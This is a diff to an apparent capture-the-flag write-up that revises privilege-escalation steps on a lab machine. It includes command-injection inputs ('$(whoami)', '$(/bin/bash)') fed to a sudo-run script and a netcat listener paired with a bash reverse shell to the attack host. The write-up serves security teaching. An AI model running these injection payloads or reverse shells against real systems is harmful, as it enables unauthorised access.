@@ -417,15 +417,17 @@ stty rows 55 columns 285
 ```
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 
+Enter an IP: $(whoami)
+
 Enter an IP: $(/bin/bash)
 ```
 
-+ **The new shell is not working properly. It only shows stderr. Redirect stdout to our shell using:** `>&2 /bin/bash`
-+ Get the pepper's shell, and read the user flag.
++ If gets **"Temporary failure in name resolution"** error, the new shell is not working properly. It only shows stderr. Redirect stdout to our shell using: `>&2 /bin/bash`
++ Get the **pepper**'s shell, and read the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd05cba2-ac58-4f92-9642-2d2ee150e7ca)
 
-+ **Alternatively**, start a netcat listener on the attack machine, and enter a reverse shell on the obtained shell of the target since the shell isn't good (doesn't give any output for commands).
++ **Alternatively**, start a netcat listener on the attack machine. Then sent a new reverse shell back to the attack machine, and upgrade it to a fully interactive shell since the shell isn't good (**doesn't give any output for commands**).
 ```
 nc -lnvp 6666
 bash -i >& /dev/tcp/10.10.14.8/6666 0>&1
